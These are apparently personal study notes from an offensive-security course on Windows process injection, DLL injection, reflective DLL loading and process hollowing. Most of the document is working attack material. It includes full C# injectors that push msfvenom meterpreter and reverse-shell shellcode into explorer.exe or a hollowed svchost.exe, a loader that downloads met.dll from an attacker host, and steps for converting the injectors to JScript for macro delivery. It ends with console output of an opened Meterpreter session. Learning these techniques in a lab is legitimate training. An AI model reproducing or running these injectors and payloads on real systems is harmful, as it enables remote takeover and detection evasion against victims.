- *process*: container created to house a running application
- process maintains it's own virtual memory space
- *thread* will have it's own stack and shares the virtual memory space of the process
- initial process injection Win32 api:
	- OpenProcess https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	- VirtualAllocEx https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
	- WriteProcessMemory https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
	- CreateRemoteThread https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread


### OpenProcess

```c
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
```
- _dwDesiredAccess_, establishes the access rights
- we can only inject code into processes running at the same or lower integrity level of the current process. This makes explorer.exe a prime target because it will always exist and does not exit until the user logs off
- _bInheritHandle_, determines if the returned handle may be inherited by a child process and the third
- _dwProcessId_, specifies the process identifier of the target process

### VirtualAllocEx

```c
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```
- In our previous shellcode runner, we used _VirtualAlloc_ to allocate memory for our shellcode. Unfortunately, that only works inside the current process so we must use the expanded _VirtualAllocEx_ API. This API can perform actions in any process that we have a valid handle to.
### WriteProcessMemory

```c
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```
- _WriteProcessMemory_, will allow us to copy data into the remote process

### CreateRemoteThread

```c
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);
```
- Similarly, since _CreateThread_ does not support the creation of remote process threads, we must rely on the _CreateRemoteThread_ API instead.


# Process Injection in C\#

Note: Installed https://github.com/microsoft/CsWin32 into Win10 Visual Studio and System.Memory nuget packages

Errata/Update: 
- `dwDesiredAccess` has a 32 bit un-signed interger value and it establishes the access rights, there are hex values we can use for the access , the acess which we can use for all rights on a process is `PROCESS_ALL_ACCESS` which can be represented in hex `0x001FFFFF` 
- offsec guide uses `0x001F0FFF` which is for XP/2k3
- PROCCESS_ALL_ACCESS hex values (https://gist.githubusercontent.com/Rhomboid/0cf96d7c82991af44fda/raw/46b93265561362eb9d631b90a7731dc985ee378d/process_access_rights.txt)
- Note: PID 4804 below is for Explorer.exe will change each time Windows is run and the hex value for dwDesiredAccess is for win xp or 2k3
```csharp
IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
```
- For P/Invoke purposes, you should use `IntPtr.Zero` in place of `NULL`. Note that this is not equivalent to the C# `null`
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$(hostname -I | cut -d' ' -f1) LPORT=9001 EXITFUNC=thread -f csharp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 511 bytes
Final size of csharp file: 2628 bytes
byte[] buf = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
...
0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,
0xd5};

```

### Exercises 

### #2 
Modify the code of the ExampleAssembly project in DotNetToJscript to create a Jscript file that executes the shellcode inside explorer.exe. Instead of hardcoding the process ID, which cannot be known remotely, use the Process.GetProcessByName method to resolve it dynamically.
- convert to js
```powershell
 .\DotNetToJScript.exe C:\users\dooley\source\repos\InjectToJscript\InjectToJscript\bin\x64\Release\InjectToJscript.dll --lang=jscript --ver=v4 -o injecttojs.js -c InjectToJscript.Class1
```

### \#3

- Port the code from C# to PowerShell to allow process injection and shellcode execution from a Word macro through PowerShell. Remember that PowerShell is started as 32-bit, so instead of injecting into explorer.exe, start a 32-bit process such as Notepad and inject into that instead.
- create revshell payload in powershell format
```bash
 ❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=9001 EXITFUNC=thread -f ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 375 bytes
Final size of ps1 file: 1830 bytes
```
- injection named injection2.ps1

### TODO:
#### Extra Mile

Process injection with _VirtualAllocEx_, _WriteProcessMemory_, and _CreateRemoteThread_ is considered a standard technique, but there are a few others to consider.

The low-level native APIs _NtCreateSection_, _NtMapViewOfSection_, _NtUnMapViewOfSection_, and _NtClose_ in ntdll.dll can be used as alternatives to _VirtualAllocEx_ and _WriteProcessMemory_.

Create C# code that performs process injection using the four new APIs instead of _VirtualAllocEx_ and _WriteProcessMemory_. Convert the code to Jscript with DotNetToJscript. Note that _CreateRemoteThread_ must still be used to execute the shellcode.

Not my code:
```csharp
using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;



public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);


    [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
    static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

    [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
    static extern int NtClose(IntPtr hObject);


    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    dir
    
    public TestClass()
    {
        Process[] explorerProcesses = Process.GetProcessesByName("explorer");
        int firstExplorerPid = explorerProcesses[0].Id;

        byte[] buf = new byte[643]
        { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
        0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
        ...
        0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,
        0xd5 };

        IntPtr sHandle = new IntPtr();
        IntPtr lHandle = Process.GetCurrentProcess().Handle;
        IntPtr pHandle = OpenProcess(0x001F0FFF, false, firstExplorerPid);


        int len = buf.Length;
        uint uLen = (uint)len;
        long cStatus = NtCreateSection(ref sHandle, 0x10000000, IntPtr.Zero, ref uLen, 0x40, 0x08000000, IntPtr.Zero);

        IntPtr baseAddrL = new IntPtr();
        uint viewSizeL = uLen;
        ulong sectionOffsetL = new ulong();
        long mStatusL = NtMapViewOfSection(sHandle, lHandle, ref baseAddrL, UIntPtr.Zero, UIntPtr.Zero, out sectionOffsetL, out viewSizeL, 2, 0, 0x04);

        IntPtr baseAddrR = new IntPtr();
        uint viewSizeR = uLen;
        ulong sectionOffsetR = new ulong();
        long mStatusR = NtMapViewOfSection(sHandle, pHandle, ref baseAddrR, UIntPtr.Zero, UIntPtr.Zero, out sectionOffsetR, out viewSizeR, 2, 0, 0x20);

        Marshal.Copy(buf, 0, baseAddrL, len);

        CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddrR, IntPtr.Zero, 0, IntPtr.Zero);

        uint uStatusL = NtUnmapViewOfSection(lHandle, baseAddrL);

        int clStatus = NtClose(sHandle);
    }
}
```
```cmd
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```
## DLL Injection

Our approach will be to try to trick the remote process into executing _LoadLibrary_ with the correct argument. Recall that when calling _CreateRemoteThread_, the fourth argument is the start address of the function run in the new thread and the fifth argument is the memory address of a buffer containing arguments for that function.

The idea is to resolve the address of _LoadLibraryA_ inside the remote process and invoke it while supplying the name of the DLL we want to load. If the address of _LoadLibraryA_ is given as the fourth argument to _CreateRemoteThread_, it will be invoked when we call _CreateRemoteThread_.

In order to supply the name of the DLL to _LoadLibraryA_, we must allocate a buffer inside the remote process and copy the name and path of the DLL into it. The address of this buffer can then be given as the fifth argument to _CreateRemoteThread_, after which it will be used with _LoadLibrary_.

However, there are several restrictions we must consider. First, the DLL must be written in C or C++ and must be unmanaged. The managed C#-based DLL we have been working with so far will not work because we can not load a managed DLL into an unmanaged process.

Secondly, DLLs normally contain APIs that are called after the DLL is loaded. In order to call these APIs, an application would first have to "resolve" their names to memory addresses through the use of _GetProcAddress_. Since _GetProcAddress_ cannot resolve an API in a remote process, we must craft our malicious DLL in a non-standard way.

- create payload and start web server
```bash
❯ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$(hostname -I | cut -d' ' -f1) LPORT=443 -f dll -o met.dll
[sudo] password for roger: 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 781 bytes
Final size of dll file: 9216 bytes
Saved as: met.dll
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.141 - - [27/May/2024 13:12:35] "GET /met.dll HTTP/1.1" 200 -

```

- modified code to make it more modern
```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;


namespace Inject

{
    class Program

    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]

        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

  

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]

        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

  

        [DllImport("kernel32.dll")]

        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

  

        [DllImport("kernel32.dll")]

        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

  

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]

        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]

        public static extern IntPtr GetModuleHandle(string lpModuleName);

  

        static readonly HttpClient client = new HttpClient();

  

        static async Task Main()

        {

  

            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            String dllName = dir + "\\met.dll";

            try

            {

                HttpResponseMessage response = await client.GetAsync("http://192.168.1.113/met.dll");

                if (response.IsSuccessStatusCode)

                {

                    using (var fs = new FileStream(dllName, FileMode.Create, FileAccess.Write, FileShare.None))

                    {

                        await response.Content.CopyToAsync(fs);

                    }

                }

  

            }

            catch (HttpRequestException e)

            {
                Console.WriteLine("Exception Caught!");
                Console.WriteLine($"Message: {e.Message}");
            }


            Process[] expProc = Process.GetProcessesByName("explorer");

            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;

            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);

        }

    }

}
```

```bash
❯ msfconsole
Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it 
with setg RHOSTS x.x.x.x
                                                  
               .;lxO0KXXXK0Oxl:.
           ,o0WMMMMMMMMMMMMMMMMMMKd,
        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
 oMMMMMMMMMMx.                    dMMMMMMMMMMx
.WMMMMMMMMM:                       :MMMMMMMMMM,
xMMMMMMMMMo                         lMMMMMMMMMO
NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
xMMMMMMMMMd                        ,0MMMMMMMMMMK;
.WMMMMMMMMMc                         'OMMMMMM0,
 lMMMMMMMMMMk.                         .kMMO'
  dMMMMMMMMMMWd'                         ..
   cWMMMMMMMMMMMNxc'.                ##########
    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
      ;0MMMMMMMMMMMMMMMo.          +:+
        .dNMMMMMMMMMMMMo          +#++:++#+
           'oOWMMMMMMMMo                +:+
               .,cdkO0K;        :+:    :+:                                
                                :::::::+:
                      Metasploit

       =[ metasploit v6.4.5-dev                           ]
+ -- --=[ 2413 exploits - 1242 auxiliary - 423 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost eth0
lhost => eth0
msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > show options

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  eth0             yes       The listen address (an interface may be specified)
   LPORT  443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://192.168.1.113:443
[!] https://192.168.1.113:443 handling request from 192.168.1.141; (UUID: 7efb85gt) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.1.113:443 handling request from 192.168.1.141; (UUID: 7efb85gt) Staging x64 payload (202844 bytes) ...
[!] https://192.168.1.113:443 handling request from 192.168.1.141; (UUID: 7efb85gt) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (192.168.1.113:443 -> 192.168.1.141:59838) at 2024-05-27 13:12:38 -0400

meterpreter > getuid
Server username: COMMANDO\<user>

```

## Reflective Dll Injection

_LoadLibrary_ performs a series of actions including loading DLL files from disk and setting the correct memory permissions. It also registers the DLL so it becomes usable from APIs like _GetProcAddress_ and is visible to tools like Process Explorer.

Since we do not need to rely on _GetProcAddress_ and want to avoid detection, we are only interested in the memory mapping of the DLL. Reflective DLL injection parses the relevant fields of the DLL's _Portable Executable_[1](https://portal.offsec.com/courses/pen-300-9502/learning/process-injection-and-migration-14686/reflective-dll-injection-14703/reflective-dll-injection-14995#fn-local_id_494-1) (PE) file format and maps the contents into memory.

In order to implement reflective DLL injection, we could write custom code to essentially recreate and improve upon the functionality of _LoadLibrary_. Since the inner workings of the code and the details of the PE file format are beyond the scope of this module, we will instead reuse existing code to execute these techniques.

The ultimate goal of this technique is to maintain the essential functionality of _LoadLibrary_ while avoiding the write to disk and avoiding detection by tools such as Process Explorer.

- Example, but the methods are older
```powershell
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll')
$procid = (Get-Process -Name explorer).Id
```
- more current version
```powershell
$response = Invoke-WebRequest -Uri "http://192.168.1.113/met.dll" -UseBasicParsing
$procid = (Get-Process -Name explorer).Id
```
- $response.Content is the byte array
- couldn't get the example to work (maybe machine needs a reboot?)

## Process Hollowing

MITRE Attack Technique: https://attack.mitre.org/techniques/T1055/012/
"Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code."


There are a few steps we must perform and components to consider, but the most important is the use of the _CREATE_SUSPENDED flag during process creation. This flag allows us to create a new suspended (or halted) process.

When a process is created through the _CreateProcess API, the operating system does three things:

1. Creates the virtual memory space for the new process.
2. Allocates the stack along with the _Thread Environment Block_ (TEB)and the _Process Environment Block_ (PEB).
3. Loads the required DLLs and the EXE into memory.

Once all of these tasks have been completed, the operating system will create a thread to execute the code, which will start at the _EntryPoint_ of the executable. If we supply the _CREATE_SUSPENDED_ flag when calling _CreateProcess_, the execution of the thread is halted just before it runs the EXE's first instruction.

#### Steps
1. Call CreateProcess API
	1. Creates virtual memory space for the new process
	2. Allocates the stack with the TEB and PEB
	3. Loads required dlls and exe into memory
2. Supply CREATE_SUSPENDED flag to the CreateProcess API
3. Need to locate the EntryPoint of the exe and overwrite it's in-memory content with staged shellcode
	1. ZwQueryInformationProcess API called to get PEP address

	```c++
			NTSTATUS WINAPI ZwQueryInformationProcess(
			  _In_      HANDLE           ProcessHandle,
			  _In_      PROCESSINFOCLASS ProcessInformationClass,
			  _Out_     PVOID            ProcessInformation,
			  _In_      ULONG            ProcessInformationLength,
			  _Out_opt_ PULONG           ReturnLength
			);
	```
	2. Supply enum from ProcessInformationClass to ZwQueryInformationProcess
	3. Supply 0 for ProcessBasicInformation in ProcessInformationClass to obtain the PEB in the suspended process
	4. Base address of the exe will be at offset 0x10 bytes into the PEB
4. Read the EXE base address
	1. use ReadProcessMemory API


It is worth noting that a memory address takes up eight bytes in a 64-bit process, while it only uses four bytes in a 32-bit process, so the use of variable types, offsets, and amount of data read must be adapted.

```csharp
using System;
using System.Runtime.InteropServices;

namespace ProcessHollow
{
    class Program
    {
        // http://www.pinvoke.net/default.aspx/Structures/SECURITY_ATTRIBUTES.html
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        // http://www.pinvoke.net/default.aspx/Structures/STARTUPINFO.html
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        // http://www.pinvoke.net/default.aspx/Structures/PROCESS_INFORMATION.html
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        // http://www.pinvoke.net/default.aspx/kernel32/CreateProcess.html
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        // http://www.pinvoke.net/default.aspx/kernel32/ResumeThread.html
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        // http://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniquePID;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen
        );

        // http://www.pinvoke.net/default.aspx/kernel32/ReadProcessMemory.html
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead
        );

        // http://www.pinvoke.net/default.aspx/kernel32/WriteProcessMemory.html
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten
        );

        // https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
        static uint CREATE_SUSPENDED = 0x00000004;

        // https://learn.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
        static int ProcessBasicInformation = 0x00000000;

        static void Main(string[] args)
        {

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi;
            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();

            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", ref sa, ref sa, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            IntPtr entryPoint = IntPtr.Zero;
            // msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.100.85 -f csharp -v shellcode (ENCODED)
            byte[] buf = new byte[734] {0xfc,0x48,0x83,0xe4,0xf0,
 ...                                     0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5};

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}
```

### DotNetToJscript

```csharp

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

[ComVisible(true)]
public class ProcessHollowClass
{

    // http://www.pinvoke.net/default.aspx/Structures/SECURITY_ATTRIBUTES.html
    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

    // http://www.pinvoke.net/default.aspx/Structures/STARTUPINFO.html
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    // http://www.pinvoke.net/default.aspx/Structures/PROCESS_INFORMATION.html
    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    // http://www.pinvoke.net/default.aspx/kernel32/CreateProcess.html
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        ref SECURITY_ATTRIBUTES lpProcessAttributes,
        ref SECURITY_ATTRIBUTES lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    // http://www.pinvoke.net/default.aspx/kernel32/ResumeThread.html
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);

    // http://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr ExitStatus;
        public IntPtr PebAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public IntPtr UniquePID;
        public IntPtr InheritedFromUniqueProcessId;
    }

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    static extern int ZwQueryInformationProcess(
        IntPtr hProcess,
        int procInformationClass,
        ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen,
        ref uint retlen
    );

    // http://www.pinvoke.net/default.aspx/kernel32/ReadProcessMemory.html
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesRead
    );

    // http://www.pinvoke.net/default.aspx/kernel32/WriteProcessMemory.html
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten
    );

    // https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
    static uint CREATE_SUSPENDED = 0x00000004;

    // https://learn.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
    static int ProcessBasicInformation = 0x00000000;
    public ProcessHollowClass()
    {

        // 1 -- Create the target process in a suspended state

        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi;
        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();

        bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", ref sa, ref sa, false, 0x4, IntPtr.Zero, null, ref si, out pi);


            // 2 -- Get the address of the Process Environment Block

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        IntPtr hProcess = pi.hProcess;
        ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size* 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);



            // 3 -- Extract the Image Base Address from the PEB

        byte[] addrBuf = new byte[IntPtr.Size];
        IntPtr nRead = IntPtr.Zero;
        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

        IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));


            // 4 -- Read the PE structure to find the EntryPoint address

        byte[] data = new byte[0x200];
        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
        uint opthdr = e_lfanew_offset + 0x28;
        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

        IntPtr entryPoint = IntPtr.Zero;


            // 5 -- Write shellcode at EntryPoint

            // msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.100.85 -f csharp -v shellcode (ENCODED)
            byte[] buf = new byte[734] {0xfc,0x48,0x83,0xe4,0xf0,
...                                    0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5};

        WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
        ResumeThread(pi.hThread);

    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}

```

- convert dll to jscript using DotNetToJscript.exe
```cmd
DotNetToJScript.exe .\source\repos\ProcessHollowClass\ProcessHollowClass\bin\x64\Release\ProcessHollowClass.dll --lang=Jscript --ver=v4 -o demo.js -c ProcessHollowClass
```